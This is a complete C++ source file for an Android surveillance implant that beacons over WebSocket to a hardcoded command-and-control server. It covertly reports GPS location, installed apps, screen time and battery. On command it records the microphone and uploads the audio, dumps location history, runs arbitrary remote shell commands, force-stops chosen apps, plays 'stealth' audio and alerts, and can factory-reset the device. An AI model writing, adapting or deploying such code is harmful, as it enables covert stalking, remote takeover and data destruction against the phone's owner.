// ─────────────────────────────────────────────────────────────────────────────
// reporter.cpp — Native Android telemetry implant
// ─────────────────────────────────────────────────────────────────────────────

// C Standard Library
#include <cctype>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>

// C++ Standard Library
#include <algorithm>
#include <array>
#include <chrono>
#include <condition_variable>
#include <fstream>
#include <memory>
#include <mutex>
#include <queue>
#include <string>
#include <thread>
#include <vector>

// POSIX
#include <dirent.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

// Android Platform (with desktop stubs for cross-compilation)
#ifdef __ANDROID__
#include <android/log.h>
#include <sys/system_properties.h>
#else
#include <cstdarg>
#define PROP_VALUE_MAX 92
static int __system_property_get(const char* name, char* value) {
    (void)name;
    if (value) value[0] = '\0';
    return 0;
}
static int __android_log_print(int prio, const char* tag, const char* fmt, ...) {
    (void)prio; (void)tag;
    va_list args;
    va_start(args, fmt);
    int ret = vfprintf(stderr, fmt, args);
    va_end(args);
    return ret;
}
#endif

// WebSocket (ixwebsocket)
#include <ixwebsocket/IXNetSystem.h>
#include <ixwebsocket/IXWebSocket.h>

// Configuration
static constexpr const char* WS_SERVER_URL  = "wss://hearts-eliminate-adrian-texts.trycloudflare.com/ws";
static constexpr const char* IMPLANT_KEY = "DeltaForce2027";
static constexpr const char* LOG_TAG = "reporter";
static constexpr const char* LOG_PATH = "/data/local/tmp/reporter.log";
static constexpr const char* DISABLE_FILE = "/data/local/tmp/reporter_disable";
static constexpr const char* GPS_FILE = "/data/local/tmp/gps_history.csv";
static constexpr const char* MIC_FILE = "/data/local/tmp/mic.wav";
static constexpr const char* LOC_FILE = "/data/local/tmp/location_enabled";

// Log rotation settings
static constexpr long MAX_LOG_SIZE = 1024 * 1024; // 1 MB
static constexpr int MAX_LOG_FILES = 5;

// ── Global State ─────────────────────────────────────────────────────────────

// Logging
FILE* g_log_file = nullptr;
size_t g_log_size = 0;
std::mutex g_log_mutex;

// Device identity (cached at startup)
std::string g_device_id;
std::string g_build_id;
std::string g_build_version;
std::string g_build_type;
std::string g_device_name;

// WebSocket C2 connection
ix::WebSocket g_webSocket;
std::queue<std::string> g_taskQueue;
std::mutex g_taskMutex;
std::condition_variable g_taskCV;

// App blocker
std::vector<std::string> g_forbiddenApps;
std::mutex g_forbiddenMutex;

// Report state tracking (delta-based reporting)
int g_ping_interval = 60;
int g_last_battery_level = -1;
int g_last_loc_state = -1;
int g_last_charging_state = -1;
double g_last_lat = 0.0;
double g_last_lon = 0.0;
std::string g_installed_apps;
std::string g_last_installed_apps;
bool g_installed_apps_dirty = true;
int g_screen_time_minutes = 0;
std::string g_last_screen_time_report_key;
std::chrono::steady_clock::time_point g_screen_time_last_update;
bool g_first_report = true;

// Pre-escaped JSON strings (populated once at startup, avoids per-report allocations)
std::string g_escaped_implant_key;
std::string g_escaped_device_id;
std::string g_escaped_build_id;
std::string g_escaped_build_version;
std::string g_escaped_build_type;
std::string g_escaped_device_name;

// ── Logging ──────────────────────────────────────────────────────────────────

/** Rotates log files when the current log exceeds MAX_LOG_SIZE. */
void rotate_logs() {
    if (!g_log_file) return;

    // Close the current log file
    fclose(g_log_file);

    // Shift old log files
    for (int i = MAX_LOG_FILES - 1; i > 0; --i) {
        std::string old_path = std::string(LOG_PATH) + "." + std::to_string(i);
        std::string new_path = std::string(LOG_PATH) + "." + std::to_string(i + 1);
        if (access(old_path.c_str(), F_OK) == 0) {
            rename(old_path.c_str(), new_path.c_str());
        }
    }

    // Rename current log to .1
    rename(LOG_PATH, (std::string(LOG_PATH) + ".1").c_str());

    // Reopen the main log file
    g_log_file = fopen(LOG_PATH, "a");
    if (g_log_file) {
        g_log_size = 0;
    }
}

/** Logs a timestamped message to logcat (Android) and the persistent log file. */
void log_message(const std::string& message) {
    std::time_t now = std::time(nullptr);
    char time_buf[24];
    struct tm tm_buf;
    localtime_r(&now, &tm_buf);
    std::strftime(time_buf, sizeof(time_buf), "%Y-%m-%d %H:%M:%S", &tm_buf);

    std::string formatted;
    formatted.reserve(22 + message.size());
    formatted.push_back('[');
    formatted += time_buf;
    formatted += "] ";
    formatted += message;

    std::lock_guard<std::mutex> log_lock(g_log_mutex);

    if (g_log_file && g_log_size + formatted.size() + 1 > MAX_LOG_SIZE) {
        rotate_logs();
    }

#ifdef __ANDROID__
    __android_log_print(ANDROID_LOG_INFO, LOG_TAG, "%s", formatted.c_str());
#else
    // After daemonize, stderr is closed so this is a no-op in production.
    fprintf(stderr, "%s\n", formatted.c_str());
#endif

    if (g_log_file) {
        fprintf(g_log_file, "%s\n", formatted.c_str());
        fflush(g_log_file);
        g_log_size += formatted.size() + 1;
    }
}

// ── Process Execution ────────────────────────────────────────────────────────

/** Executes a command via fork/exec with stdout/stderr silenced. */
bool run_command_no_output(const std::vector<std::string>& argv) {
    if (argv.empty()) return false;

    std::vector<char*> cargs;
    cargs.reserve(argv.size() + 1);
    for (const auto& arg : argv) {
        cargs.push_back(const_cast<char*>(arg.c_str()));
    }
    cargs.push_back(nullptr);

    pid_t pid = fork();
    if (pid == -1) return false;
    if (pid == 0) {
        // Redirect stdout/stderr to /dev/null to avoid leaked output
        int devnull = open("/dev/null", O_WRONLY);
        if (devnull >= 0) {
            dup2(devnull, STDOUT_FILENO);
            dup2(devnull, STDERR_FILENO);
            close(devnull);
        }
        execvp(cargs[0], cargs.data());
        _exit(127);
    }

    int status = 0;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

/** Executes a shell command via popen and returns its trimmed stdout output. */
std::string exec_cmd(const std::string& cmd) {
    std::array<char, 256> buffer;
    std::string result;
    result.reserve(4096); // pre-allocate to prevent heap fragmentation
    log_message("Executing command: " + cmd);

    auto pipe_closer = [](FILE* f) {
        if (f) pclose(f);
    };
    std::unique_ptr<FILE, decltype(pipe_closer)> pipe(popen(cmd.c_str(), "r"), pipe_closer);
    if (!pipe) {
        log_message("Failed to execute command: " + cmd);
        return "UNKNOWN";
    }
    
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result.append(buffer.data());
    }

    // Trim trailing whitespace/newlines
    result.erase(std::find_if(result.rbegin(), result.rend(), [](unsigned char ch) {
        return !std::isspace(ch);
    }).base(), result.end());

    if (result.empty()) {
        log_message("Command returned empty output: " + cmd);
        return "UNKNOWN";
    }
    
    if (result.size() > 200) {
        log_message("Command output (" + std::to_string(result.size()) + " bytes, truncated): " + result.substr(0, 200) + "...");
    } else {
        log_message("Command output: " + result);
    }
    return result;
}

// ── JSON Utilities ───────────────────────────────────────────────────────────

/** Extracts a value from a flat JSON object by key name. */
std::string get_json_val(const std::string& json, const std::string& key) {
    if (json.empty() || key.empty()) return "";
    
    std::string search = "\"" + key + "\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    
    pos = json.find(':', pos + search.length());
    if (pos == std::string::npos) return "";
    pos++; // skip ':'
    
    // Skip potential spaces
    while (pos < json.length() && std::isspace(static_cast<unsigned char>(json[pos]))) pos++;
    
    std::string value;
    if (pos < json.length() && json[pos] == '\"') {
        pos++; // skip opening quote
        size_t end = json.find('\"', pos);
        if (end != std::string::npos) {
            value = json.substr(pos, end - pos);
        }
    } else {
        size_t end = json.find_first_of(",}", pos);
        if (end == std::string::npos) end = json.length();
        
        // Trim trailing spaces for numeric/boolean values
        while (end > pos && std::isspace(static_cast<unsigned char>(json[end - 1]))) end--;
        value = json.substr(pos, end - pos);
    }

    return value;
}

/** Escapes a string for safe embedding inside a JSON value. */
std::string json_escape(const std::string& input) {
    std::string escaped;
    escaped.reserve(input.size());
    for (unsigned char c : input) {
        switch (c) {
            case '"': escaped += "\\\""; break;
            case '\\': escaped += "\\\\"; break;
            case '\b': escaped += "\\b"; break;
            case '\f': escaped += "\\f"; break;
            case '\n': escaped += "\\n"; break;
            case '\r': escaped += "\\r"; break;
            case '\t': escaped += "\\t"; break;
            default:
                if (c < 0x20) {
                    char buf[7];
                    std::snprintf(buf, sizeof(buf), "\\u%04x", c);
                    escaped += buf;
                } else {
                    escaped.push_back(c);
                }
                break;
        }
    }
    return escaped;
}

// ── Device State Readers ─────────────────────────────────────────────────────

/** Returns true if the WebSocket connection to the C2 server is active. */
bool websocket_is_open() {
    return g_webSocket.getReadyState() == ix::WebSocket::ReadyState::Open;
}

/**
 * Checks if location tracking is enabled via flag file.
 */
bool is_location_enabled() {
    int fd = open(LOC_FILE, O_RDONLY);
    if (fd >= 0) {
        char ch = '1';
        if (read(fd, &ch, 1) == 1) {
            close(fd);
            return ch == '1';
        }
        close(fd);
        return true; // default enabled
    }
    // File doesn't exist — create with default "enabled"
    fd = open(LOC_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        write(fd, "1", 1);
        close(fd);
    }
    return true;
}

/** Writes the location tracking on/off state to the flag file. */
void set_location_file(int status) {
    int fd = open(LOC_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        char ch = status ? '1' : '0';
        write(fd, &ch, 1);
        close(fd);
    }
}

/** Reads battery percentage directly from sysfs (0-100, or -1 on failure). */
int get_battery_level() {
    int fd = open("/sys/class/power_supply/battery/capacity", O_RDONLY);
    if (fd < 0) return -1;
    char buf[8];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = '\0';
    return atoi(buf);
}

/** Returns 1 if charging or full, 0 otherwise. Reads sysfs directly. */
int get_charging_state() {
    int fd = open("/sys/class/power_supply/battery/status", O_RDONLY);
    if (fd < 0) return 0;
    char buf[32];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = '\0';
    // "Charging\n" or "Full\n"
    return (buf[0] == 'C' || buf[0] == 'F') ? 1 : 0;
}

// ── System Info ──────────────────────────────────────────────────────────────

/** Reads an Android system property via __system_property_get. */
std::string get_sys_prop(const char* prop_name) {
    char value[PROP_VALUE_MAX];
    if (__system_property_get(prop_name, value) > 0) {
        return std::string(value);
    }
    return "UNKNOWN";
}

std::string get_build_id() { return get_sys_prop("ro.build.id"); }
std::string get_build_version() { return get_sys_prop("ro.build.version.release"); }
std::string get_build_type() { return get_sys_prop("ro.build.type"); }
std::string get_device_name() { return get_sys_prop("ro.product.model"); }
std::string get_serialno() { 
    std::string s = get_sys_prop("ro.serialno");
    return s == "UNKNOWN" ? "UNKNOWN_DEVICE" : s; 
}

/** Returns a comma-separated list of all installed package names. */
std::string get_installed_apps() {
    std::ifstream ifs("/data/system/packages.list");
    if (!ifs.is_open()) {
        // Fallback if packages.list is not readable
        FILE* pipe = popen("pm list packages", "r");
        if (!pipe) return "";
        std::array<char, 128> buffer;
        std::string apps;

        while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
            std::string line(buffer.data());
            if (!line.empty() && line.back() == '\n') {
                line.pop_back();
            }
            constexpr const char prefix[] = "package:";
            if (line.rfind(prefix, 0) == 0) {
                std::string pkg = line.substr(sizeof(prefix) - 1);
                if (!pkg.empty()) {
                    if (!apps.empty()) apps.push_back(',');
                    apps += pkg;
                }
            }
        }
        pclose(pipe);
        return apps;
    }

    std::string apps;
    std::string line;
    while (std::getline(ifs, line)) {
        size_t space_pos = line.find(' ');
        if (space_pos != std::string::npos) {
            std::string pkg = line.substr(0, space_pos);
            if (!pkg.empty()) {
                if (!apps.empty()) apps.push_back(',');
                apps += pkg;
            }
        }
    }
    return apps;
}

// ── GPS Parsing ──────────────────────────────────────────────────────────────

/** Parses a floating-point number from a token string (skips leading non-numeric chars). */
static bool parse_double_from_token(const std::string& token, double& value) {
    size_t pos = 0;
    while (pos < token.size() && token[pos] != '+' && token[pos] != '-' && !std::isdigit(static_cast<unsigned char>(token[pos]))) {
        pos++;
    }
    if (pos >= token.size()) {
        return false;
    }

    try {
        size_t consumed = 0;
        value = std::stod(token.substr(pos), &consumed);
        return consumed > 0;
    } catch (const std::exception&) {
        return false;
    }
}

/** Scans a text line for a valid lat,lon coordinate pair. */
static bool parse_coords_in_line(const std::string& line, double& lat, double& lon) {
    size_t pos = 0;
    while (true) {
        size_t comma = line.find(',', pos);
        if (comma == std::string::npos) break;

        size_t start = comma;
        while (start > 0 && (std::isdigit(static_cast<unsigned char>(line[start - 1])) || line[start - 1] == '+' || line[start - 1] == '-' || line[start - 1] == '.')) {
            start--;
        }

        size_t end = comma + 1;
        while (end < line.size() && (std::isdigit(static_cast<unsigned char>(line[end])) || line[end] == '+' || line[end] == '-' || line[end] == '.')) {
            end++;
        }

        std::string lat_token = line.substr(start, comma - start);
        std::string lon_token = line.substr(comma + 1, end - (comma + 1));

        double lat_value = 0.0;
        double lon_value = 0.0;
        if (parse_double_from_token(lat_token, lat_value) && parse_double_from_token(lon_token, lon_value)) {
            if (lat_value >= -90.0 && lat_value <= 90.0 && lon_value >= -180.0 && lon_value <= 180.0) {
                lat = lat_value;
                lon = lon_value;
                return true;
            }
        }

        pos = comma + 1;
    }
    return false;
}

/** Extracts GPS coordinates from `dumpsys location` output, preferring GPS > network > passive. */
static bool get_location_from_dumpsys_output(const std::string& output, double& lat, double& lon) {
    if (output.empty() || output == "UNKNOWN") {
        return false;
    }

    // Prefer GPS provider output if available.
    static const std::vector<std::string> providers = {"gps", "network", "passive"};
    for (const auto& provider : providers) {
        size_t pos = 0;
        while ((pos = output.find(provider, pos)) != std::string::npos) {
            size_t line_end = output.find('\n', pos);
            std::string line = output.substr(pos, line_end == std::string::npos ? output.size() - pos : line_end - pos);
            if (parse_coords_in_line(line, lat, lon)) {
                return true;
            }
            pos += provider.size();
        }
    }

    // Fallback to any valid coordinate pair in the dumpsys output.
    return parse_coords_in_line(output, lat, lon);
}

/** Fetches the current device location by running `dumpsys location`. */
bool get_location_from_gps_provider(double& lat, double& lon) {
    std::string output = exec_cmd("dumpsys location");
    return get_location_from_dumpsys_output(output, lat, lon);
}

// ── Screen Time & App Tracking ───────────────────────────────────────────────

/** Returns a string key like "2026-06-04-15" for grouping screen time by hour. */
std::string make_hour_key(time_t t) {
    char buf[32];
    struct tm tm_buf;
    localtime_r(&t, &tm_buf);
    std::strftime(buf, sizeof(buf), "%Y-%m-%d-%H", &tm_buf);
    return std::string(buf);
}

/** Accumulates screen-on minutes since the last update. */
void update_screen_time() {
    auto now = std::chrono::steady_clock::now();
    if (g_screen_time_last_update == std::chrono::steady_clock::time_point()) {
        g_screen_time_last_update = now;
        return;
    }

    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - g_screen_time_last_update);
    if (elapsed.count() >= 60) {
        int minutes = static_cast<int>(elapsed.count() / 60);
        g_screen_time_minutes += minutes;
        g_screen_time_last_update += std::chrono::seconds(minutes * 60);
    }
}

/** Returns cached installed apps list, refreshing only when dirty. */
const std::string& get_current_installed_apps() {
    if (g_installed_apps.empty() || g_installed_apps_dirty) {
        g_installed_apps = get_installed_apps();
        g_installed_apps_dirty = false;
    }
    return g_installed_apps;
}

/** Returns true if the current hour differs from the last screen time report. */
bool should_send_screen_time(time_t now) {
    const std::string current_hour = make_hour_key(now);
    if (g_first_report || current_hour != g_last_screen_time_report_key) {
        g_last_screen_time_report_key = current_hour;
        return true;
    }
    return false;
}

// ── Networking ───────────────────────────────────────────────────────────────

/** Sends a JSON telemetry report over the WebSocket. */
void send_report(const std::string& data) {
    log_message("Sending report (" + std::to_string(data.size()) + " bytes)");
    if (!websocket_is_open()) {
        log_message("WS not open; report skipped.");
        return;
    }
    g_webSocket.sendText(data);
}

/** Uploads a file to the C2 server: sends metadata JSON followed by raw binary. */
void upload_file(const std::string& filepath, const std::string& type = "file") {
    if (access(filepath.c_str(), F_OK) == -1) {
        log_message("File not found, skipping upload: " + filepath);
        return;
    }
    log_message("Uploading file natively: " + filepath);
    
    // First, send metadata
    std::string meta_json = "{\"implant_key\":\"" + g_escaped_implant_key + "\", \"upload_type\":\"" + json_escape(type) + "\", \"filepath\":\"" + json_escape(filepath) + "\"}";
    if (websocket_is_open()) {
        g_webSocket.sendText(meta_json);
    } else {
        log_message("WS not open; upload metadata skipped.");
    }

    // Then, send binary file data (Optimized: Direct alloc, no stringstream)
    std::ifstream file(filepath, std::ios::binary | std::ios::ate);
    if (file) {
        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);
        
        std::string buffer;
        buffer.resize(size);
        if (file.read(&buffer[0], size)) {
            if (websocket_is_open()) {
                g_webSocket.sendBinary(buffer);
                log_message("Upload finished natively via WS (" + std::to_string(size) + " bytes).");
            } else {
                log_message("WS not open; file upload skipped.");
            }
        }
    } else {
        log_message("Failed to read file for upload.");
    }
}
// ── Telemetry Reporting ─────────────────────────────────────────────────────

/**
 * Collects device state (battery, GPS, apps, screen time) and sends a
 * delta-compressed JSON report to the C2 server. Only changed fields
 * are included to minimize bandwidth.
 */
void do_report() {
    log_message("Starting report.");
    update_screen_time();
    time_t now = time(nullptr);
    bool loc_allowed = is_location_enabled();
    int loc_state = loc_allowed ? 1 : 0;
    double current_lat = 0.0;
    double current_lon = 0.0;
    bool have_location = false;
    if (loc_allowed) {
        have_location = get_location_from_gps_provider(current_lat, current_lon);
        if (!have_location) {
            log_message("Failed to acquire GPS coordinates from dumpsys.");
        }
    }
    int battery_level = get_battery_level();
    int charging_state = get_charging_state();
    const std::string& apps = get_current_installed_apps();
    bool send_screen_time = should_send_screen_time(now);
    bool send_latlon = false;
    bool state_changed = g_first_report;

    if (g_first_report || loc_state != g_last_loc_state) {
        send_latlon = have_location;
    } else if (loc_allowed && have_location && (current_lat != g_last_lat || current_lon != g_last_lon)) {
        send_latlon = true;
    }

    if (!state_changed) state_changed = (battery_level != g_last_battery_level);
    if (!state_changed) state_changed = (charging_state != g_last_charging_state);
    if (!state_changed) state_changed = (loc_state != g_last_loc_state);
    if (!state_changed) state_changed = send_latlon;
    if (!state_changed) state_changed = (!apps.empty() && apps != g_last_installed_apps);
    if (!state_changed) state_changed = send_screen_time;

    if (!state_changed) {
        log_message("No report-worthy state change detected; skipping report.");
        g_first_report = false;
        return;
    }

    std::string json;
    json.reserve(512);
    json = "{\"implant_key\":\"";
    json += g_escaped_implant_key;
    json += "\",\"device_id\":\"";
    json += g_escaped_device_id;
    json += "\"";

    if (g_first_report || battery_level != g_last_battery_level) {
        json += ",\"battery\":";
        json += std::to_string(battery_level);
        g_last_battery_level = battery_level;
    }

    if (g_first_report || charging_state != g_last_charging_state) {
        json += ",\"charging\":";
        json += std::to_string(charging_state);
        g_last_charging_state = charging_state;
    }

    if (g_first_report || loc_state != g_last_loc_state) {
        json += ",\"loc_state\":";
        json += std::to_string(loc_state);
        g_last_loc_state = loc_state;
    }

    if (send_latlon) {
        json += ",\"lat\":";
        json += std::to_string(current_lat);
        json += ",\"lon\":";
        json += std::to_string(current_lon);
        g_last_lat = current_lat;
        g_last_lon = current_lon;
    }

    if (!apps.empty() && (g_first_report || apps != g_last_installed_apps)) {
        json += ",\"installed_apps\":\"";
        json += json_escape(apps);
        json += "\"";
        g_last_installed_apps = apps;
    }

    if (send_screen_time) {
        json += ",\"screen_time_minutes\":";
        json += std::to_string(g_screen_time_minutes);
        json += ",\"event\":\"hourly_screen_time_update\"";
    }

    json += ",\"build_id\":\"";
    json += g_escaped_build_id;
    json += "\"";
    json += ",\"build_version\":\"";
    json += g_escaped_build_version;
    json += "\"";
    json += ",\"build_type\":\"";
    json += g_escaped_build_type;
    json += "\"";
    json += ",\"device\":\"";
    json += g_escaped_device_name;
    json += "\"}";

    send_report(std::move(json));
    log_message("Report finished.");
    g_first_report = false;
}

// ── C2 Command Execution ─────────────────────────────────────────────────────

/** Records audio from the device microphone for a specified duration using tinycap. */
void do_mic_record(int duration_s) {
    if (duration_s <= 0) return;
    std::string cmd = "tinycap " + std::string(MIC_FILE) + " -D 0 -d 0 -c 1 -r 16000 -b 16 -p 1024 -n 4 -t " + std::to_string(duration_s);
    log_message("Starting microphone recording for " + std::to_string(duration_s) + " seconds.");
    exec_cmd(cmd);
    log_message("Microphone recording finished.");
    upload_file(MIC_FILE);
}

/** Dumps GPS history from the system location cache and radio logs to a local file. */
void do_gps_dump() {
    log_message("Dumping GPS history.");
    std::string output = exec_cmd("dumpsys location");

    int fd = open(GPS_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        if (output != "UNKNOWN" && !output.empty()) {
            write(fd, output.data(), output.size());
            write(fd, "\n", 1);
        }

        std::string log_output = exec_cmd("logcat -d -b radio");
        size_t start = 0;
        while (start < log_output.size()) {
            size_t end = log_output.find('\n', start);
            size_t line_len = (end == std::string::npos) ? log_output.size() - start : end - start;
            // Check for "GpsLocation" within this line segment without allocating
            if (log_output.find("GpsLocation", start) != std::string::npos &&
                log_output.find("GpsLocation", start) < start + line_len) {
                write(fd, log_output.data() + start, line_len);
                write(fd, "\n", 1);
            }
            if (end == std::string::npos) break;
            start = end + 1;
        }
        close(fd);
    }
    log_message("GPS history dump finished.");
    upload_file(GPS_FILE);
}

/** Executes an arbitrary shell command requested by the C2 server and reports the output back. */
void do_shell_command(const std::string& shell_cmd) {
    if (shell_cmd.empty()) return;
    log_message("Executing remote shell command: " + shell_cmd);
    std::string result = exec_cmd(shell_cmd);
    
    if (result == "UNKNOWN") {
        result = "[Executed with no output or failed]";
    }
    
    std::string json_req = "{\"implant_key\":\"" + g_escaped_implant_key + "\",\"command_result\":\"" + json_escape(result) + "\"}";
    g_webSocket.sendText(json_req);
    log_message("Remote shell command execution finished.");
}

/** Triggers an Android intent to factory reset the device. */
void do_factory_reset() {
    log_message("Factory reset requested by C2.");
    std::string result = exec_cmd("am broadcast -a android.intent.action.MASTER_CLEAR");
    if (result == "UNKNOWN") {
        result = "[Factory reset command executed with no output or failed]";
    }

    std::string json_req = "{\"implant_key\":\"" + g_escaped_implant_key + "\",\"command_result\":\"" + json_escape(result) + "\"}";
    g_webSocket.sendText(json_req);
    log_message("Factory reset command finished.");
}

// ── WebSocket Task Processing ────────────────────────────────────────────────

/** Processes all queued tasks received from the C2 server natively. */
void process_tasks() {
    std::vector<std::string> tasks;
    {
        std::lock_guard<std::mutex> lock(g_taskMutex);
        tasks.reserve(g_taskQueue.size()); // Pre-allocate vector capacity
        while (!g_taskQueue.empty()) {
            // std::move prevents allocating and copying the JSON payload again
            tasks.push_back(std::move(g_taskQueue.front()));
            g_taskQueue.pop();
        }
    }
    
    if (tasks.empty()) return;
    log_message("Processing " + std::to_string(tasks.size()) + " queued C2 tasks.");

    for (const auto& response : tasks) {
        std::string task = get_json_val(response, "task");
        if (task == "mic_record") {
            int duration = 0;
            try {
                duration = std::stoi(get_json_val(response, "duration"));
            } catch (const std::exception&) {}
            std::thread([duration]() { do_mic_record(duration); }).detach(); // Async
        } else if (task == "gps_dump") {
            std::thread([]() { do_gps_dump(); }).detach(); // Async
        } else if (task == "shell") {
            std::string cmd = get_json_val(response, "command");
            std::thread([cmd]() { do_shell_command(cmd); }).detach(); // Async
        } else if (task == "report") {
            do_report();
        } else if (task == "update_blocked_apps") {
            std::string apps_str = get_json_val(response, "apps");
            std::vector<std::string> apps;
            size_t start = 0;
            while (start < apps_str.size()) {
                size_t comma = apps_str.find(',', start);
                std::string item = apps_str.substr(start, comma == std::string::npos ? std::string::npos : comma - start);
                if (!item.empty() && item != " ") {
                    apps.push_back(item);
                }
                if (comma == std::string::npos) break;
                start = comma + 1;
            }
            std::lock_guard<std::mutex> lock(g_forbiddenMutex);
            g_forbiddenApps = apps;
            log_message("Updated blocked apps list: " + std::to_string(apps.size()) + " apps blocked.");
        } else if (task == "set_location") {
            int track = 0;
            try { track = std::stoi(get_json_val(response, "track")); } catch(...) {}
            set_location_file(track);
            log_message("Location tracking set to: " + std::to_string(track));
            do_report();
        } else if (task == "check_location_state") {
            log_message("Reporting location state explicitly.");
            do_report();
        } else if (task == "factory_reset") {
            std::thread([]() { do_factory_reset(); }).detach(); // Async, because this may reboot the device
        } else if (task == "refresh_installed_apps") {
            log_message("Refreshing installed apps on-demand.");
            g_installed_apps_dirty = true;
            do_report();
        } else if (task == "set_interval") {
            int interval = g_ping_interval;
            try { interval = std::stoi(get_json_val(response, "interval")); } catch(...) {}
            g_ping_interval = interval;
            log_message("Ping interval updated to: " + std::to_string(g_ping_interval));
        } else if (task == "system_alert") {
            std::string state = get_json_val(response, "state");
            std::string text = get_json_val(response, "text");
            log_message("System alert received: state=" + state + " text=" + text);
            if (!state.empty() || !text.empty()) {
                std::vector<std::string> args = {"am", "start", "-n", "com.stealthalert/.AlertActivity", "--es", "title", state, "--es", "text", text};
                bool started = run_command_no_output(args);
                log_message(std::string("StealthAlert activity ") + (started ? "started" : "failed to start"));
            }
        } else if (task == "audio_blast") {
            std::string play = get_json_val(response, "play");
            log_message("Audio blast request received: play=" + play);
            if (!play.empty()) {
                std::vector<std::string> args = {"am", "start", "-n", "com.stealthaudio/.StealthAudioActivity", "--es", "action", "play", "--es", "volume", play};
                bool started = run_command_no_output(args);
                log_message(std::string("StealthAudio activity ") + (started ? "started" : "failed to start"));
            }
        } else if (task == "power_cmd") {
            std::string action = get_json_val(response, "action");
            log_message("Power command received: action=" + action);
        } else if (!task.empty()) {
            log_message("Unknown task received: " + task);
        }
    }
}

// ── Main Entry Point ─────────────────────────────────────────────────────────

/** Main daemon process: initializes networking, caches identity, daemonizes, and enters the event loop. */
int main(int argc, char* argv[]) {
    (void)argc;
    (void)argv;
    // Open log file
    g_log_file = fopen(LOG_PATH, "a");
    if (g_log_file) {
        fseek(g_log_file, 0, SEEK_END);
        g_log_size = static_cast<size_t>(ftell(g_log_file));
    }

    // Cache constant device metadata to avoid repeated sysprop lookups
    g_device_id = get_serialno();
    g_build_id = get_build_id();
    g_build_version = get_build_version();
    g_build_type = get_build_type();
    g_device_name = get_device_name();

    log_message("Reporter starting up.");

    // Pre-escape constant strings once — avoids per-report allocations
    g_escaped_implant_key = json_escape(IMPLANT_KEY);
    g_escaped_device_id = json_escape(g_device_id);
    g_escaped_build_id = json_escape(g_build_id);
    g_escaped_build_version = json_escape(g_build_version);
    g_escaped_build_type = json_escape(g_build_type);
    g_escaped_device_name = json_escape(g_device_name);

    // Init IXWebSocket
    ix::initNetSystem();
    g_webSocket.setUrl(WS_SERVER_URL);
    g_webSocket.setPingInterval(45); // Keep-alive ping every 45 secs to prevent dropped NAT connections
    g_webSocket.enableAutomaticReconnection(); // Ensure it recovers connection drops
    
    g_webSocket.setOnMessageCallback([](const ix::WebSocketMessagePtr& msg) {
        if (msg->type == ix::WebSocketMessageType::Message) {
            log_message("WS Command Received.");
            {
                std::lock_guard<std::mutex> lock(g_taskMutex);
                g_taskQueue.push(msg->str);
            }
            g_taskCV.notify_one(); // Wake up main thread instantly
        } else if (msg->type == ix::WebSocketMessageType::Open) {
            log_message("WS Connection open");
        } else if (msg->type == ix::WebSocketMessageType::Error) {
            log_message("WS Connection error: " + msg->errorInfo.reason);
        }
    });
    g_webSocket.start();

    // Main loop
    // Start app blocker thread
    std::thread([]() {
        char path[256];
        char cmdline[256];
        while (true) {
            std::vector<std::string> current_apps;
            {
                std::lock_guard<std::mutex> lock(g_forbiddenMutex);
                current_apps = g_forbiddenApps;
            }
            
            if (!current_apps.empty()) {
                // Read all running processes once per cycle
                std::vector<std::string> running_processes;
                DIR* dir = opendir("/proc");
                if (dir) {
                    struct dirent* ent;
                    while ((ent = readdir(dir)) != nullptr) {
                        if (!isdigit(ent->d_name[0])) continue;
                        snprintf(path, sizeof(path), "/proc/%s/cmdline", ent->d_name);
                        int fd = open(path, O_RDONLY);
                        if (fd >= 0) {
                            ssize_t bytes = read(fd, cmdline, sizeof(cmdline) - 1);
                            if (bytes > 0) {
                                cmdline[bytes] = '\0';
                                running_processes.emplace_back(cmdline);
                            }
                            close(fd);
                        }
                    }
                    closedir(dir);
                }

                for (const auto& pkg : current_apps) {
                    bool running = false;
                    std::string pkg_prefix = pkg + ":";
                    for (const auto& proc : running_processes) {
                        if (proc == pkg || proc.rfind(pkg_prefix, 0) == 0) {
                            running = true;
                            break;
                        }
                    }
                    if (running) {
                        run_command_no_output({"am", "force-stop", pkg});
                    }
                }
            }
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
    }).detach();

    while (true) {
        if (access(DISABLE_FILE, F_OK) == 0) {
            log_message("Disable file found. Exiting.");
            break;
        }
        
        do_report();
        
        // Sleep until we get a notification from websocket, or max ping interval
        int interval = std::max(1, g_ping_interval);
        std::unique_lock<std::mutex> lock(g_taskMutex);
        g_taskCV.wait_for(lock, std::chrono::seconds(interval), []{ return !g_taskQueue.empty(); });
        lock.unlock(); // Unlock before processing to prevent deadlocks
        
        process_tasks();
    }

    log_message("Reporter shutting down.");
    g_webSocket.stop();
    ix::uninitNetSystem();

    if (g_log_file) {
        fclose(g_log_file);
    }

    return 0;
}
